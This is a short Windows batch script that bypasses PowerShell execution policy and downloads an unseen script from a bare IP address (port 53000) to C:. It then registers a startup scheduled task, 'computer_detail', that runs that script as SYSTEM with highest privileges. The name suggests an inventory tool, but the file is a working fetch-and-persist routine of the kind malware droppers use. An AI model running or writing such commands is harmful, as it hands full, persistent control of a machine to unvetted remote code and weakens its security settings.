@echo off

powershell -c Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force 
powershell  Get-ExecutionPolicy

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://103.62.153.74:53000/computer_detail/script_win7.ps1','C:/script_win7.ps1')"

schtasks /create /tn "computer_detail" /sc onstart /delay 0010:00 /rl highest /ru system /tr "powershell -ExecutionPolicy Bypass -File C:/script_win7.ps1"

pause